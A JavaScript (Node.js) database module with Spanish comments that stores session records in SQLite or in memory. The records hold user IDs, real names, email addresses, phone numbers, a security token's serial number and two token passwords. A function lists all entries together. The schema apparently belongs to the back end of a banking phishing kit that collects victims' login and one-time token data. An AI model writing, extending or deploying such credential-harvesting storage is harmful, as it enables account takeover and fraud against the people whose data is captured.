// Base de datos opcional - funciona sin better-sqlite3
import { fileURLToPath } from 'url'
import { dirname, join } from 'path'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)

let db = null
let dbAvailable = false
let stmts = null

// Intentar cargar better-sqlite3
try {
  const Database = (await import('better-sqlite3')).default
  db = new Database(join(__dirname, 'sessions.db'))
  dbAvailable = true
  
  // Crear tablas
  db.exec(`
    CREATE TABLE IF NOT EXISTS sessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT UNIQUE NOT NULL,
      user_id TEXT,
      user_name TEXT,
      real_name TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS tax_data (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT NOT NULL,
      full_name TEXT,
      email TEXT,
      mobile_phone TEXT,
      landline_phone TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (session_id) REFERENCES sessions(session_id)
    );
    CREATE TABLE IF NOT EXISTS token_data (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT NOT NULL,
      token_serial TEXT,
      token_first_pass TEXT,
      token_second_pass TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (session_id) REFERENCES sessions(session_id)
    );
    CREATE TABLE IF NOT EXISTS config (
      key TEXT PRIMARY KEY,
      value TEXT,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE INDEX IF NOT EXISTS idx_sessions_session_id ON sessions(session_id);
    CREATE INDEX IF NOT EXISTS idx_tax_data_session_id ON tax_data(session_id);
    CREATE INDEX IF NOT EXISTS idx_token_data_session_id ON token_data(session_id);
  `)
  
  // Preparar statements
  stmts = {
    insertSession: db.prepare(`
      INSERT OR REPLACE INTO sessions (session_id, user_id, user_name, real_name, updated_at)
      VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
    `),
    insertTaxData: db.prepare(`
      INSERT OR REPLACE INTO tax_data (session_id, full_name, email, mobile_phone, landline_phone)
      VALUES (?, ?, ?, ?, ?)
    `),
    insertTokenData: db.prepare(`
      INSERT OR REPLACE INTO token_data (session_id, token_serial, token_first_pass, token_second_pass)
      VALUES (?, ?, ?, ?)
    `),
    getAllSessions: db.prepare(`
      SELECT s.*, 
             t.full_name, t.email, t.mobile_phone, t.landline_phone,
             tok.token_serial, tok.token_first_pass, tok.token_second_pass
      FROM sessions s
      LEFT JOIN tax_data t ON s.session_id = t.session_id
      LEFT JOIN token_data tok ON s.session_id = tok.session_id
      ORDER BY s.updated_at DESC
      LIMIT 1000
    `),
    getConfig: db.prepare('SELECT value FROM config WHERE key = ?'),
    setConfig: db.prepare(`
      INSERT OR REPLACE INTO config (key, value, updated_at)
      VALUES (?, ?, CURRENT_TIMESTAMP)
    `),
    getAllConfig: db.prepare('SELECT key, value, updated_at FROM config')
  }
  
  console.log('✅ Base de datos SQLite inicializada')
} catch (error) {
  console.warn('⚠️ Base de datos SQLite no disponible (funcionando solo en memoria):', error.message)
  dbAvailable = false
}

// Almacenamiento en memoria como fallback
const memoryStore = {
  sessions: new Map(),
  config: new Map()
}

function saveSession(sessionData) {
  const sessionId = sessionData.sessionId || sessionData.idSesion || `session_${Date.now()}_${Math.random().toString(36).substring(2, 15)}`
  
  if (dbAvailable && stmts) {
    try {
      const transaction = db.transaction(() => {
        stmts.insertSession.run(
          sessionId,
          sessionData.user || sessionData.userId,
          sessionData.userName,
          sessionData.realName
        )
        
        if (sessionData.taxData && (
          sessionData.taxData.fullName || 
          sessionData.taxData.email || 
          sessionData.taxData.mobilePhone || 
          sessionData.taxData.landlinePhone
        )) {
          stmts.insertTaxData.run(
            sessionId,
            sessionData.taxData.fullName,
            sessionData.taxData.email,
            sessionData.taxData.mobilePhone,
            sessionData.taxData.landlinePhone
          )
        }
        
        if (sessionData.tokenSerial || sessionData.tokenPasswords) {
          stmts.insertTokenData.run(
            sessionId,
            sessionData.tokenSerial,
            sessionData.tokenPasswords?.first || '',
            sessionData.tokenPasswords?.second || ''
          )
        }
      })
      transaction()
    } catch (error) {
      console.error('Error guardando en BD:', error)
    }
  }
  
  // Siempre guardar en memoria
  memoryStore.sessions.set(sessionId, {
    ...sessionData,
    sessionId,
    timestamp: sessionData.timestamp || new Date().toISOString(),
    lastUpdate: new Date().toISOString()
  })
  
  return sessionId
}

function getAllSessions() {
  if (dbAvailable && stmts) {
    try {
      return stmts.getAllSessions.all()
    } catch (error) {
      console.error('Error obteniendo sesiones de BD:', error)
    }
  }
  
  // Retornar de memoria
  return Array.from(memoryStore.sessions.values()).map(s => ({
    session_id: s.sessionId,
    user_id: s.user || s.userId,
    user_name: s.userName,
    real_name: s.realName,
    full_name: s.taxData?.fullName,
    email: s.taxData?.email,
    mobile_phone: s.taxData?.mobilePhone,
    landline_phone: s.taxData?.landlinePhone,
    token_serial: s.tokenSerial,
    token_first_pass: s.tokenPasswords?.first,
    token_second_pass: s.tokenPasswords?.second,
    created_at: s.timestamp,
    updated_at: s.lastUpdate
  }))
}

function getConfig(key) {
  if (dbAvailable && stmts) {
    try {
      const result = stmts.getConfig.get(key)
      if (result) return result.value
    } catch (error) {
      console.error(`Error obteniendo config ${key}:`, error)
    }
  }
  
  // Retornar de memoria
  return memoryStore.config.get(key) || null
}

function setConfig(key, value) {
  if (dbAvailable && stmts) {
    try {
      stmts.setConfig.run(key, value)
      console.log(`✅ Config guardada en BD: ${key}`)
    } catch (error) {
      console.error(`Error guardando config ${key}:`, error)
    }
  }
  
  // Siempre guardar en memoria
  memoryStore.config.set(key, value)
  return true
}

function setConfigs(configs) {
  if (dbAvailable && stmts) {
    try {
      const transaction = db.transaction(() => {
        for (const [key, value] of Object.entries(configs)) {
          if (value !== null && value !== undefined) {
            stmts.setConfig.run(key, String(value))
          }
        }
      })
      transaction()
      console.log('✅ Configuraciones guardadas en BD')
    } catch (error) {
      console.error('Error guardando configuraciones en BD:', error)
    }
  }
  
  // Siempre guardar en memoria
  for (const [key, value] of Object.entries(configs)) {
    if (value !== null && value !== undefined) {
      memoryStore.config.set(key, String(value))
    }
  }
  
  return true
}

function getAllConfig() {
  if (dbAvailable && stmts) {
    try {
      return stmts.getAllConfig.all()
    } catch (error) {
      console.error('Error obteniendo configs de BD:', error)
    }
  }
  
  // Retornar de memoria
  return Array.from(memoryStore.config.entries()).map(([key, value]) => ({
    key,
    value,
    updated_at: new Date().toISOString()
  }))
}

export { db, saveSession, getAllSessions, getConfig, getAllConfig, setConfig, setConfigs }
